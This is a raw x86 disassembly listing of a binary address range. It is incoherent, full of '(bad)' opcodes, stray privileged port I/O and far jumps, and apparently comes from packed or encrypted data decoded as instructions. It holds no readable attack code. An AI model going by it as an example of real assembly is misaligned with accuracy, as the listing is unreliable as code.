  40a2c1:	xchg   BYTE PTR [ebx+0x31203adc],dl
  40a2c7:	clc    
  40a2c8:	inc    edx
  40a2c9:	loope  0x40a30a
  40a2cb:	test   eax,eax
  40a2cd:	std    
  40a2ce:	(bad)  
  40a2cf:	out    0x53,eax
  40a2d1:	loop   0x40a2ca
  40a2d3:	mov    ecx,0x4899ab5b
  40a2d8:	lods   eax,DWORD PTR ds:[esi]
  40a2d9:	dec    esp
  40a2da:	mov    bl,0x77
  40a2dc:	or     eax,0x6ead0264
  40a2e1:	xor    ebp,edx
  40a2e3:	cmp    DWORD PTR [ebp+0x18],ecx
  40a2e6:	sub    al,0xdd
  40a2e8:	mov    ecx,0x68e497c0
  40a2ed:	mov    edx,0xf669df36
  40a2f2:	stc    
  40a2f3:	xlat   BYTE PTR ds:[ebx]
  40a2f4:	inc    eax
  40a2f5:	scas   eax,DWORD PTR es:[edi]
  40a2f6:	hlt    
  40a2f7:	jae    0x40a28d
  40a2f9:	sbb    bh,BYTE PTR [ebx+0x25]
  40a2fc:	jno    0x40a379
  40a2fe:	xor    BYTE PTR [edi+0x59],dl
  40a301:	mov    eax,ds:0x2b167bc5
  40a306:	xchg   bl,dh
  40a308:	mov    BYTE PTR [edi+0x7b9c0711],bl
  40a30e:	sbb    dh,BYTE PTR [edx+0x1af6a186]
  40a314:	push   ecx
  40a315:	int3   
  40a316:	dec    eax
  40a317:	retf   
  40a318:	in     eax,0x77
  40a31a:	out    0xa4,al
  40a31c:	mov    dl,BYTE PTR [edi+0x22]
  40a31f:	mov    eax,0xa797a9d2
  40a324:	mov    esi,0xbcb01bcb
  40a329:	push   ebp
  40a32a:	ja     0x40a35b
  40a32c:	jnp    0x40a38a
  40a32e:	push   ecx
  40a32f:	loope  0x40a3ab
  40a331:	or     BYTE PTR [esi+0x46280c19],al
  40a337:	sbb    cl,BYTE PTR ds:0xc98bed0e
  40a33d:	adc    ah,BYTE PTR [ebx-0x348b3b7e]
  40a343:	add    al,BYTE PTR [esi-0x11]
  40a346:	sub    ch,ah
  40a348:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a349:	popa   
  40a34a:	dec    ebp
  40a34b:	xchg   esp,eax
  40a34c:	lods   al,BYTE PTR ds:[esi]
  40a34d:	jle    0x40a33b
  40a34f:	jbe    0x40a3cc
  40a351:	lahf   
  40a352:	in     eax,dx
  40a353:	mov    ch,0xa3
  40a355:	xor    BYTE PTR [edi+eax*8+0x25],0x15
  40a35a:	out    dx,eax
  40a35b:	sbb    eax,0x57b55040
  40a360:	in     al,dx
  40a361:	clc    
  40a362:	(bad)  
  40a363:	sti    
  40a364:	add    dl,BYTE PTR [esi+0xf]
  40a367:	jecxz  0x40a3d2
  40a369:	ficom  WORD PTR [ecx+0x79]
  40a36c:	add    eax,0xa5e8c11a
  40a371:	cmp    BYTE PTR [ebp+0x3f],dh
  40a374:	xchg   edx,eax
  40a375:	sub    al,BYTE PTR [edx-0x4b]
  40a378:	cli    
  40a379:	cmc    
  40a37a:	xchg   BYTE PTR [eax],ah
  40a37c:	retf   0x5c83
  40a37f:	jmp    0x8191:0xb0878438
  40a386:	data16 int3 
  40a388:	push   ss
  40a389:	lods   eax,DWORD PTR ds:[esi]
  40a38a:	call   0x8beac450
  40a38f:	out    0xaf,al
  40a391:	add    al,0x85
  40a393:	push   es
  40a394:	imul   esp,ebp,0x616afa07
  40a39a:	sti    
  40a39b:	xchg   edx,eax
  40a39c:	xchg   esp,eax
  40a39d:	pop    ss
  40a39e:	cmp    ah,dh
  40a3a0:	dec    ecx
  40a3a1:	fild   WORD PTR [eax+edi*8+0x3d1c34cb]
  40a3a8:	adc    edi,ecx
  40a3aa:	dec    ecx
  40a3ab:	popa   
  40a3ac:	mov    cl,0x71
  40a3ae:	popf   
  40a3af:	mov    ds:0x3f2e977a,al
  40a3b4:	gs aad 0xe4
  40a3b7:	pop    esp
  40a3b8:	lahf   
  40a3b9:	std    
  40a3ba:	sbb    bl,BYTE PTR [esp+edx*2+0x37]
  40a3be:	test   esp,0xe2870767
  40a3c4:	inc    esp
  40a3c5:	cmp    eax,0x3e4cf844
  40a3ca:	mov    dh,0x49
  40a3cc:	sbb    eax,0x5f49317e
  40a3d1:	dec    esi
  40a3d2:	sub    al,0x8f
  40a3d4:	pop    eax
  40a3d5:	rcl    BYTE PTR [esp+esi*1],1
  40a3d8:	mov    ds:0x781ea714,eax
  40a3dd:	clc    
  40a3de:	jmp    0x40a39c
  40a3e0:	lods   al,BYTE PTR ds:[esi]
  40a3e1:	pop    ebp
  40a3e2:	cmp    eax,0x2325033f
  40a3e7:	or     ebx,DWORD PTR [edx+0x2fa79536]
  40a3ed:	mov    eax,ebx
  40a3ef:	inc    esi
  40a3f0:	out    dx,eax
  40a3f1:	mov    ah,0x1a
  40a3f3:	inc    ebp
  40a3f4:	addr16 dec edx
  40a3f6:	cmp    ch,ch
  40a3f8:	xchg   ebp,eax
  40a3f9:	jb     0x40a42d
  40a3fb:	sbb    BYTE PTR [eax+0x65],0xdc
  40a3ff:	pop    edx
  40a400:	sbb    BYTE PTR [eax-0x7272b155],bl
  40a406:	dec    ebx
  40a407:	scas   al,BYTE PTR es:[edi]
  40a408:	neg    ebp
  40a40a:	adc    eax,0xb2d3c160
  40a40f:	add    dh,BYTE PTR [ecx+esi*4]
  40a412:	xor    ebx,esi
  40a414:	ror    DWORD PTR [edi+0x2f],0xa9
  40a418:	xor    DWORD PTR [ebp+0x27],0x15
  40a41c:	cmp    DWORD PTR [eax-0xb],ebp
  40a41f:	enter  0xc86,0x39
  40a423:	test   BYTE PTR [ecx],bl
  40a425:	test   eax,0xbd5dd10e
  40a42a:	fild   DWORD PTR [ecx+0x11f519ef]
  40a430:	mov    ch,0x75
  40a432:	inc    edi
  40a433:	pop    ss
  40a434:	fmul   QWORD PTR [ebx]
  40a436:	jp     0x40a411
  40a438:	sar    BYTE PTR [edx*4-0x4556d650],1
  40a43f:	jl     0x40a402
  40a441:	dec    ebx
  40a442:	inc    esi
  40a443:	mov    ah,0xfa
  40a445:	dec    ebx
  40a446:	popf   
  40a447:	push   eax
  40a448:	ds xchg ecx,eax
  40a44a:	and    edi,DWORD PTR [ecx+0x3]
  40a44d:	imul   eax,DWORD PTR [esp+ebp*1+0x63b02184],0x4f6432cb
  40a458:	retf   
  40a459:	test   DWORD PTR [ebx],ebp
  40a45b:	ret    
  40a45c:	xchg   esi,eax
  40a45d:	xor    eax,0x6c845f40
  40a462:	inc    eax
  40a463:	daa    
  40a464:	push   ss
  40a465:	clc    
  40a466:	sbb    bl,BYTE PTR [eax]
  40a468:	xchg   ah,al
  40a46a:	test   eax,0xd72979d0
  40a46f:	sub    BYTE PTR [eax],al
  40a471:	mov    ebx,?
  40a473:	push   esi
  40a475:	mov    ebx,0x479f4182
  40a47a:	mov    eax,0xba01bc3e
  40a47f:	(bad)  
  40a480:	pop    es
  40a481:	mov    esi,0x9bd92983
  40a486:	adc    DWORD PTR ds:0xc7fd0967,0xffffffc3
  40a48d:	mov    ebx,0xf3cd9a7d
  40a492:	adc    BYTE PTR [edi+0x3f],ah
  40a495:	and    BYTE PTR [edi-0x120fedd9],al
  40a49b:	push   esi
  40a49c:	or     ah,BYTE PTR [esi-0x38]
  40a49f:	aas    
  40a4a0:	and    ebp,esp
  40a4a2:	popa   
  40a4a3:	(bad)  
  40a4a4:	enter  0x32c0,0x11
  40a4a8:	stc    
  40a4a9:	jge    0x40a45e
  40a4ab:	mov    edx,ebx
  40a4ad:	scas   al,BYTE PTR es:[edi]
  40a4ae:	icebp  
  40a4af:	and    ch,al
  40a4b1:	add    DWORD PTR [ebx-0x42],edi
  40a4b4:	shl    DWORD PTR [edi-0x8],1
  40a4b7:	fmul   DWORD PTR [ebp+0x79e1d5b9]
  40a4bd:	pushf  
  40a4be:	sub    DWORD PTR [ebp+0x28],0xf4ee63bb
  40a4c5:	mov    dh,0x8a
  40a4c7:	push   esi
  40a4c8:	sub    eax,0x38d2db50
  40a4cd:	test   eax,0x2103d485
  40a4d2:	xor    eax,0x4e932e6
  40a4d7:	push   esi
  40a4d8:	mov    edx,esi
  40a4da:	ror    DWORD PTR [eax],0x60
  40a4dd:	jmp    0x26f9:0x450d53fc
  40a4e4:	(bad)  
  40a4e5:	jp     0x40a505
  40a4e7:	inc    ebx
  40a4e8:	fisub  WORD PTR [ebx-0x10]
  40a4eb:	xchg   ecx,eax
  40a4ec:	dec    edx
  40a4ed:	mov    ?,WORD PTR [ecx+0xfbc9960]
  40a4f3:	inc    ebx
  40a4f4:	sbb    DWORD PTR [ebx+0x3251d62],esp
  40a4fa:	sbb    ebx,DWORD PTR ds:0x468634b0
  40a500:	xor    dl,dh
  40a502:	adc    dl,BYTE PTR [ecx+0x65]
  40a505:	hlt    
  40a506:	push   esp
  40a507:	cwde   
  40a508:	int    0x5f
  40a50a:	sbb    ecx,DWORD PTR [edi]
  40a50c:	ins    DWORD PTR es:[edi],dx
  40a50d:	fadd   QWORD PTR [ecx+0x97388c1]
  40a513:	jae    0x40a555
  40a515:	mov    al,0xc6
  40a517:	sbb    cl,BYTE PTR [ebx-0x38]
  40a51a:	test   al,0x2d
  40a51c:	pushf  
  40a51d:	stos   DWORD PTR es:[edi],eax
  40a51e:	add    ebp,DWORD PTR [esi-0x32]
  40a521:	out    0xa2,eax
  40a523:	(bad)  
  40a524:	or     eax,0xf8b2fb96
  40a529:	sti    
  40a52a:	adc    eax,0xe1ef39e3
  40a52f:	dec    ebp
  40a530:	retf   0x6b33
  40a533:	adc    DWORD PTR [edi],esp
  40a535:	push   esi
  40a536:	fisubr DWORD PTR [edi-0x66a272f5]
  40a53c:	ja     0x40a546
  40a53e:	(bad)  
  40a53f:	out    0xe1,eax
  40a541:	sar    BYTE PTR [edi+esi*2],0xed
  40a545:	push   edx
  40a546:	dec    edi
  40a547:	xor    eax,0x64c8466f
  40a54c:	push   ebx
  40a54d:	(bad)  
  40a54e:	dec    ebp
  40a54f:	mov    al,ds:0xe0b0e73f
  40a554:	fadd   QWORD PTR [ecx]
  40a556:	cli    
  40a557:	mov    eax,ds:0xe55eb66b
  40a55c:	stos   BYTE PTR es:[edi],al
  40a55d:	xor    al,0xd1
  40a55f:	push   ds
  40a560:	sbb    eax,0x3cde44c
  40a565:	or     ebx,DWORD PTR [ebx-0x22c05d79]
  40a56b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a56c:	push   es
  40a56d:	enter  0x8201,0xda
  40a571:	dec    eax
  40a572:	and    BYTE PTR [ebp+edi*8+0x1d],ch
  40a576:	dec    edx
  40a577:	rol    bl,1
  40a579:	loop   0x40a527
  40a57b:	mul    cl
  40a57d:	pop    esi
  40a57e:	mov    eax,ds:0xa061e454
  40a583:	jg     0x40a52a
  40a585:	neg    esi
  40a587:	adc    eax,0x27543466
  40a58c:	stc    
  40a58d:	test   DWORD PTR [eax],0x231cf8fd
  40a593:	add    DWORD PTR [eax-0x65],ebx
  40a596:	loopne 0x40a5de
  40a598:	or     esi,edi
  40a59a:	test   BYTE PTR [ebx+0x64],0xad
  40a59e:	push   edx
  40a59f:	and    ax,0xea6e
  40a5a3:	dec    ecx
  40a5a4:	ss or  al,0xb0
  40a5a7:	jno    0x40a533
  40a5a9:	leave  
  40a5aa:	add    DWORD PTR [edx+0x42468e4d],edi
  40a5b0:	fisttp QWORD PTR [ebx-0x61]
  40a5b3:	je     0x40a571
  40a5b5:	call   0xb48fec17
  40a5ba:	inc    edx
  40a5bb:	xor    BYTE PTR [edi+0x26],bl
  40a5be:	stos   DWORD PTR es:[edi],eax
  40a5bf:	inc    eax
  40a5c0:	std    
  40a5c1:	xchg   ecx,eax
  40a5c2:	push   0xe0c0075a
  40a5c7:	mov    edi,edx
  40a5c9:	and    esi,esi
  40a5cb:	push   ebx
  40a5cc:	dec    esp
  40a5cd:	call   0xb2be1a4c
  40a5d2:	inc    ecx
  40a5d3:	gs or  al,0xf1
  40a5d6:	(bad)
  40a5da:	add    eax,0xbd34edef
  40a5df:	mov    bl,0x79
  40a5e1:	sub    DWORD PTR [esi],eax
  40a5e3:	out    0xf0,al
  40a5e5:	arpl   WORD PTR [ebp-0xbde4553],dx
  40a5eb:	das    
  40a5ec:	in     eax,0x73
  40a5ee:	mov    edi,0x5a6a93da
  40a5f3:	mov    BYTE PTR [edi+0x22],ch
  40a5f6:	out    dx,al
  40a5f7:	pop    edx
  40a5f8:	test   eax,0xae1e082f
  40a5fd:	mov    ebp,0x871f9966
  40a602:	push   ecx
  40a603:	pop    eax
  40a604:	dec    edi
  40a605:	out    0xa3,al
  40a607:	dec    esi
  40a608:	out    0xc9,eax
  40a60a:	jg     0x40a5cb
  40a60c:	inc    eax
  40a60d:	sbb    al,0xa8
  40a60f:	in     eax,dx
  40a610:	mov    eax,0x91528da6
  40a615:	in     eax,dx
  40a616:	xchg   ebx,eax
  40a617:	in     eax,0x5d
  40a619:	(bad)  
  40a61a:	cli    
  40a61b:	xor    BYTE PTR [bx+0x54],bl
  40a61f:	mov    dh,0x79
  40a621:	or     BYTE PTR [ebp+esi*8+0x2e74d651],ch
  40a628:	add    dh,al
  40a62a:	and    cl,BYTE PTR [ecx-0x207fa5b8]
  40a630:	shr    dh,cl
  40a632:	mov    ds:0xfd77279d,al
  40a637:	gs jmp 0x29fa:0xbbf45aa2
  40a63f:	sub    cl,BYTE PTR [esi]
  40a641:	cmc    
  40a642:	xor    edi,DWORD PTR [ebp-0x1e]
  40a645:	mov    eax,0x810b443a
  40a64a:	les    ecx,FWORD PTR [ecx+0x460a186e]
  40a650:	sub    DWORD PTR [ebp+0x73],edi
  40a653:	mov    ah,0x2a
  40a655:	pop    es
  40a656:	pop    ds
  40a657:	add    BYTE PTR [eax-0x60],bl
  40a65a:	sub    dl,ch
  40a65c:	and    BYTE PTR [edx],al
  40a65e:	icebp  
  40a65f:	aam    0x4f
  40a661:	mov    ch,0xca
  40a663:	cmp    dl,ch
  40a665:	adc    dl,ah
  40a667:	jecxz  0x40a659
  40a669:	aad    0xf5
  40a66b:	(bad)  
  40a66c:	jb     0x40a632
  40a66e:	int    0x1a
  40a670:	lock sbb bh,BYTE PTR [edx+0x3f47930f]
  40a677:	add    BYTE PTR [edi-0x3c],0x24
  40a67b:	mov    dh,bh
  40a67d:	xchg   esi,eax
  40a67e:	jg     0x40a60a
  40a680:	pushf  
  40a681:	or     ebp,esi
  40a683:	mov    esp,0xa7711cdd
  40a688:	xchg   DWORD PTR [edx],esp
  40a68a:	mov    eax,DWORD PTR ds:0x2d19c6ff
  40a690:	xchg   esp,eax
  40a691:	mov    cs,WORD PTR [ebx+0x14]
  40a694:	in     al,dx
  40a695:	in     eax,dx
  40a696:	pop    ebx
  40a697:	and    DWORD PTR [ebp+0x51],0x591d2972
  40a69e:	or     DWORD PTR [edx+0x4c],esi
  40a6a1:	call   0xc92d:0x6125069f
  40a6a8:	outs   dx,DWORD PTR ds:[esi]
  40a6a9:	(bad)  
  40a6aa:	retf   0xca9a
  40a6ad:	jecxz  0x40a713
  40a6af:	nop
  40a6b0:	xchg   ecx,eax
  40a6b1:	pop    ebx
  40a6b2:	xchg   ecx,eax
  40a6b3:	and    eax,0xa867cc25
  40a6b8:	mov    al,ds:0x79c81db
  40a6bd:	adc    al,0x91
  40a6bf:	mov    eax,ds:0x81997a37
  40a6c4:	dec    edi
  40a6c5:	(bad)  
  40a6c6:	idiv   DWORD PTR ss:[ebx-0x497d1ea4]
  40a6cd:	cwde   
  40a6ce:	push   esp
  40a6cf:	xlat   BYTE PTR ds:[ebx]
  40a6d0:	ret    0x1c2d
  40a6d3:	mov    DWORD PTR [ecx+0x65],ebp
  40a6d6:	ins    DWORD PTR es:[edi],dx
  40a6d7:	add    al,0xce
  40a6d9:	test   al,0x68
  40a6db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6dc:	dec    edi
  40a6dd:	lods   al,BYTE PTR ds:[esi]
  40a6de:	inc    ebx
  40a6df:	mov    eax,ds:0x12dd0d6f
  40a6e4:	sbb    eax,0xa3dff6db
  40a6e9:	inc    edi
  40a6ea:	not    BYTE PTR [ecx-0x21]
  40a6ed:	repnz mov ch,0xa9
  40a6f0:	mov    eax,ds:0x7ed16909
  40a6f5:	inc    esp
  40a6f6:	mov    ds:0xbfa22d1b,eax
  40a6fb:	out    dx,eax
  40a6fc:	cmp    edx,edx
  40a6fe:	fs inc eax
  40a700:	ror    DWORD PTR [ebp-0x2b],0xc6
  40a704:	pop    esp
  40a705:	inc    edi
  40a706:	xor    bl,bh
  40a708:	ds push esp
  40a70a:	pop    ss
  40a70b:	pop    esp
  40a70c:	push   edx
  40a70d:	adc    ebp,DWORD PTR [ecx+0x7f1d49f6]
  40a713:	jg     0x40a708
  40a715:	inc    ecx
  40a716:	dec    esp
  40a717:	call   0x85e4:0x4f4c64b9
  40a71e:	xchg   edx,eax
  40a71f:	add    dh,dh
  40a721:	adc    esp,DWORD PTR [edi+0x76]
  40a724:	jae    0x40a71a
  40a726:	or     BYTE PTR [edi+eax*8+0x63a112f8],cl
  40a72d:	fwait
  40a72e:	sti    
  40a72f:	outs   dx,BYTE PTR ds:[esi]
  40a730:	retf   
  40a731:	fwait
  40a732:	pop    ebx
  40a733:	inc    edx
  40a734:	fs xchg ecx,eax
  40a736:	test   BYTE PTR [edi-0x3e],ah
  40a739:	stos   DWORD PTR es:[edi],eax
  40a73a:	and    eax,0x9a47a1ec
  40a73f:	lock pop es
  40a741:	ja     0x40a708
  40a743:	cmp    DWORD PTR [ecx+0x55],esi
  40a746:	mov    al,0xf8
  40a748:	mov    ds:0x73368b8,al
  40a74d:	jne    0x40a714
  40a74f:	ss sub eax,edi
  40a752:	scas   al,BYTE PTR es:[edi]
  40a753:	mov    edx,0x71178fd0
  40a758:	add    eax,0x261b6be5
  40a75d:	pop    ss
  40a75e:	or     al,0xcb
  40a760:	(bad)  
  40a761:	xchg   esi,eax
  40a762:	xor    BYTE PTR [esi+0x5312df5b],ah
  40a768:	popf   
  40a769:	fsub   DWORD PTR [edx+0x1b]
  40a76c:	sbb    ecx,DWORD PTR [eax-0x28bdf71d]
  40a772:	leave  
  40a773:	lods   al,BYTE PTR ds:[esi]
  40a774:	idiv   DWORD PTR [ecx+0x260b8d18]
  40a77a:	dec    edx
  40a77b:	test   eax,0xc666a92b
  40a780:	fsubr  QWORD PTR ds:0x551a055d
  40a786:	stc    
  40a787:	push   es
  40a788:	dec    ebx
  40a789:	clc    
  40a78a:	into   
  40a78b:	out    dx,eax
  40a78c:	pop    ss
  40a78d:	pop    esi
  40a78e:	push   ss
  40a78f:	push   edi
  40a790:	jbe    0x40a741
  40a792:	sbb    BYTE PTR [eax-0x3a83042f],0xc2
  40a799:	mov    ah,0xc4
  40a79b:	mov    al,BYTE PTR [ebx+0x14]
  40a79e:	push   ds
  40a79f:	scas   al,BYTE PTR es:[edi]
  40a7a0:	and    DWORD PTR [ebp+edi*2+0x17],edi
  40a7a4:	xchg   ecx,eax
  40a7a5:	fistp  QWORD PTR fs:[eax]
  40a7a8:	popf   
  40a7a9:	pop    ss
  40a7aa:	mov    ebp,0x12ebca7a
  40a7af:	in     al,0x51
  40a7b1:	and    edx,DWORD PTR [edx]
  40a7b3:	aam    0xbc
  40a7b5:	fwait
  40a7b6:	inc    edi
  40a7b7:	pop    es
  40a7b8:	in     eax,dx
  40a7b9:	loopne 0x40a800
  40a7bb:	repnz pop DWORD PTR [esi+0x43]
  40a7bf:	jb     0x40a813
  40a7c1:	xor    BYTE PTR [edx],0xbe
  40a7c4:	xor    eax,0xbf10a037
  40a7c9:	test   eax,0xcbd1988c
  40a7ce:	popa   
  40a7cf:	sub    al,0x3b
  40a7d1:	sahf   
  40a7d2:	enter  0x215,0x74
  40a7d6:	inc    esp
  40a7d7:	add    DWORD PTR [edx+0x4d3bb864],esp
  40a7dd:	int    0x74
  40a7df:	sbb    eax,0xab239287
  40a7e4:	xor    DWORD PTR [ecx-0x49],0x69d9270b
  40a7eb:	or     al,0xb4
  40a7ed:	mov    ds:0x7a489283,al
  40a7f2:	ds ret 
  40a7f4:	popf   
  40a7f5:	repz mov bh,0xb6
  40a7f8:	push   0xfd3219f4
  40a7fd:	shl    BYTE PTR [eax-0x62],1
  40a800:	lock sub eax,0xf5de4093
  40a806:	xchg   esp,eax
  40a807:	pushf  
  40a808:	push   esi
  40a809:	shr    DWORD PTR [ecx-0x5c],cl
  40a80c:	js     0x40a7da
  40a80e:	sbb    DWORD PTR [si+0x49],ebp
  40a812:	mov    edx,0xc5ee8af1
  40a817:	rol    BYTE PTR [esi+0x50],1
  40a81a:	lahf   
  40a81b:	pop    ebx
  40a81c:	jbe    0x40a863
  40a81e:	push   ss
  40a81f:	push   edi
  40a820:	add    eax,0x71a8f230
  40a825:	xor    BYTE PTR [ebx+0x321e062f],bl
  40a82b:	stc    
  40a82c:	dec    ecx
  40a82d:	out    0x57,al
  40a82f:	sbb    al,0xd5
  40a831:	loopne 0x40a84c
  40a833:	scas   eax,DWORD PTR es:[edi]
  40a834:	mov    bh,0x64
  40a836:	fs ja  0x40a81c
  40a839:	jge    0x40a864
  40a83b:	push   0x65
  40a83d:	fs push esp
  40a83f:	pop    esp
  40a840:	(bad)  
  40a841:	aaa    
  40a842:	arpl   sp,sp
  40a844:	inc    esi
  40a845:	in     al,0xd
  40a847:	xor    ecx,ebp
  40a849:	push   es
  40a84a:	sbb    BYTE PTR [ecx-0xa70dc0f],0x14
  40a851:	lock jmp 0x40a867
  40a854:	cmc    
  40a855:	mov    esp,0x302fcbd5
  40a85a:	inc    ecx
  40a85b:	dec    ebx
  40a85c:	jecxz  0x40a8b2
  40a85e:	add    eax,0x588492f9
  40a863:	pandn  mm3,QWORD PTR [edx+0xf3145c9]
  40a86a:	and    ebx,DWORD PTR [edx]
  40a86c:	push   0xc
  40a86e:	mov    ch,BYTE PTR [ebx+eiz*4-0x4fcbcdc3]
  40a875:	out    dx,al
  40a876:	jle    0x40a89c
  40a878:	mov    edi,DWORD PTR [ecx+ecx*1]
  40a87b:	mov    BYTE PTR [ebx+0x16],0xa9
  40a87f:	jmp    0x40a86e
  40a881:	loop   0x40a80a
  40a883:	aad    0x89
  40a885:	retf   
  40a886:	outs   dx,BYTE PTR ds:[esi]
  40a887:	shl    BYTE PTR [edx-0x33],0xda
  40a88b:	mov    ch,0x61
  40a88d:	push   edx
  40a88e:	lods   al,BYTE PTR ds:[esi]
  40a88f:	repz mov edi,DWORD PTR [esi-0xefba06b]
  40a896:	mov    gs,WORD PTR [ebx+0x2e]
  40a899:	cmp    eax,0xb38e58d
  40a89e:	outs   dx,BYTE PTR ds:[esi]
  40a89f:	jo     0x40a8dc
  40a8a1:	sbb    al,0x2
  40a8a3:	and    DWORD PTR [ecx-0x6b],ecx
  40a8a6:	pop    ss
  40a8a7:	int3   
  40a8a8:	cdq    
  40a8a9:	sbb    ch,dl
  40a8ab:	int    0xba
  40a8ad:	ins    DWORD PTR es:[edi],dx
  40a8ae:	push   eax
  40a8af:	out    dx,eax
  40a8b0:	or     DWORD PTR [esi-0x423166d2],0x56
  40a8b7:	adc    ah,dl
  40a8b9:	mov    bl,0x7c
  40a8bb:	in     al,0xbc
  40a8bd:	cmp    esi,DWORD PTR [ebp+0x2cd35dc2]
  40a8c3:	ins    BYTE PTR es:[edi],dx
  40a8c4:	xor    eax,0xb74fae0e
  40a8c9:	adc    eax,esp
  40a8cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8cc:	or     esi,esp
  40a8ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8cf:	xchg   ebp,eax
  40a8d0:	sub    ch,ah
  40a8d2:	imul   esi,DWORD PTR [ecx+0x35f4ecbd],0x7f7a3673
  40a8dc:	scas   eax,DWORD PTR es:[edi]
  40a8dd:	xor    eax,0xc181c72d
  40a8e2:	in     al,0xc
  40a8e4:	sub    eax,0xa45c681d
  40a8e9:	pop    ecx
  40a8ea:	sbb    al,0x24
  40a8ec:	cwde   
  40a8ed:	hlt    
  40a8ee:	push   ecx
  40a8ef:	mov    ah,0x6f
  40a8f1:	inc    edx
  40a8f2:	mov    ch,0x79
  40a8f4:	mov    ch,0xcf
  40a8f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8f7:	loope  0x40a949
  40a8f9:	mov    ch,0x5d
  40a8fb:	sub    BYTE PTR [eax+0x2773086e],ch
  40a901:	enter  0x6ddc,0xa8
  40a905:	jb     0x40a93a
  40a907:	push   es
  40a908:	pop    ebx
  40a909:	jmp    0xbe791a9d
  40a90e:	xchg   esp,eax
  40a90f:	xor    DWORD PTR [edx+0x7e],edx
  40a912:	jp     0x40a98c
  40a914:	aam    0x54
  40a916:	cmp    DWORD PTR ds:0x1ecf8376,0xc1f8e797
  40a920:	pop    edx
  40a921:	mov    WORD PTR [esi+0xda108bb],?
  40a927:	sub    al,0xfc
  40a929:	pushf  
  40a92a:	iret   
  40a92b:	sub    bh,BYTE PTR [esi-0x3c]
  40a92e:	add    al,0xcb
  40a930:	and    BYTE PTR [ebx],dl
  40a932:	dec    eax
  40a933:	mov    BYTE PTR [edi],al
  40a935:	stos   DWORD PTR es:[edi],eax
  40a936:	call   0xafa0:0x3efd8373
  40a93d:	mov    eax,0x9a48bcd3
  40a942:	loop   0x40a92d
  40a944:	mov    cl,0x33
  40a946:	xchg   ecx,eax
  40a947:	cmp    edi,DWORD PTR fs:[edx+0x15426914]
  40a94e:	bound  esp,QWORD PTR [ecx-0x10]
  40a951:	arpl   bp,bx
  40a953:	loopne 0x40a950
  40a955:	(bad)  
  40a956:	jle    0x40a980
  40a958:	mov    edi,0x648ced96
  40a95d:	shl    ecx,1
  40a95f:	fsub   DWORD PTR [edx-0x75e819a9]
  40a965:	dec    esp
  40a966:	sub    eax,0xb07f8963
  40a96b:	sbb    BYTE PTR [ebx+0x118067e8],al
  40a971:	jp     0x40a993
  40a973:	imul   esp,DWORD PTR [edi+0x21],0x1a5ecc2f
  40a97a:	mov    ecx,0x75f08bab
  40a97f:	rcr    DWORD PTR [eax+0x2697e56c],cl
  40a985:	mov    ss,esp
  40a987:	push   edx
  40a988:	lea    edx,[esi-0x5b]
  40a98b:	sub    eax,0x892e4420
  40a990:	cli    
  40a991:	stc    
  40a992:	xor    DWORD PTR [edi-0x32],ecx
  40a995:	test   eax,0x36959c72
  40a99a:	push   ebx
  40a99b:	cmp    edi,DWORD PTR [edi+0x60]
  40a99e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a99f:	stc    
  40a9a0:	push   esi
  40a9a1:	loopne 0x40a9d2
  40a9a3:	sar    BYTE PTR [edx],cl
  40a9a5:	pop    edi
  40a9a6:	xchg   DWORD PTR [eax-0x53c77c4b],esi
  40a9ac:	cmp    dh,ah
  40a9ae:	or     DWORD PTR [ebx+0xc15467],ebx
  40a9b4:	retf   
  40a9b5:	aaa    
  40a9b6:	lds    ebp,FWORD PTR [ebx+0x53]
  40a9b9:	mov    bh,0x3a
  40a9bb:	pop    eax
  40a9bc:	adc    ch,BYTE PTR [esi+0x6dab4cb4]
  40a9c2:	sub    ecx,DWORD PTR [edx+0xd]
  40a9c5:	repz push edi
  40a9c7:	sbb    DWORD PTR [esi+0x4c],ebx
  40a9ca:	test   DWORD PTR es:[esi],0x21168776
  40a9d1:	mov    al,0xaf
  40a9d3:	cmp    bh,BYTE PTR [esi+0x74992044]
  40a9d9:	xchg   BYTE PTR [ebx],cl
  40a9db:	cmp    dl,ch
  40a9dd:	repz xor DWORD PTR [ebx+esi*4-0x26a87c9b],esp
  40a9e5:	push   ss
  40a9e6:	xor    BYTE PTR [esi+0x39],al
  40a9e9:	mov    ds:0x1d96ba25,al
  40a9ee:	out    dx,eax
  40a9ef:	and    al,0x6c
  40a9f1:	in     al,dx
  40a9f2:	repz adc cl,BYTE PTR [ebx-0x2c41c54a]
  40a9f9:	mov    ebp,0x3a8e6082
  40a9fe:	mov    edi,0x9c7ec918
  40aa03:	cmp    edi,ebp
  40aa05:	leave  
  40aa06:	in     eax,0x5c
  40aa08:	mov    ds:0xe85cf5fc,al
  40aa0d:	sar    DWORD PTR [ebp+0x2debdac6],1
  40aa13:	jge    0x40aa4a
  40aa15:	fs test al,0xc8
  40aa18:	push   0x764edae
  40aa1d:	imul   ebp,DWORD PTR [ebp+0x13],0xffffffa8
  40aa21:	push   ecx
  40aa22:	icebp  
  40aa23:	ret    0x5eb0
  40aa26:	cwd    
  40aa28:	add    eax,0xabede321
  40aa2d:	push   0x9ac43f00
  40aa32:	out    dx,eax
  40aa33:	xchg   edi,eax
  40aa34:	add    al,0xfb
  40aa36:	xchg   DWORD PTR [eax],esi
  40aa38:	mov    ecx,0x81d3a8de
  40aa3d:	out    dx,eax
  40aa3e:	pop    esi
  40aa3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa40:	cmp    eax,0xed15568d
  40aa45:	mov    ?,WORD PTR gs:0xc6144c0d
  40aa4c:	pop    ecx
  40aa4d:	adc    al,BYTE PTR [ebx-0x426be067]
  40aa53:	sbb    al,cl
  40aa55:	ss aad 0x4e
  40aa58:	ss jnp 0x40aa93
  40aa5b:	popf   
  40aa5c:	(bad)  
  40aa5d:	fmul   st(3),st
  40aa5f:	mov    ecx,fs
  40aa61:	call   0xd1f5:0xa17b0ae6
  40aa68:	push   ss
  40aa69:	or     eax,ecx
  40aa6b:	scas   eax,DWORD PTR es:[edi]
  40aa6c:	push   esi
  40aa6d:	dec    edx
  40aa6e:	retf   
  40aa6f:	mov    dl,BYTE PTR [ecx+0xb338754]
  40aa75:	inc    esp
  40aa76:	inc    ebp
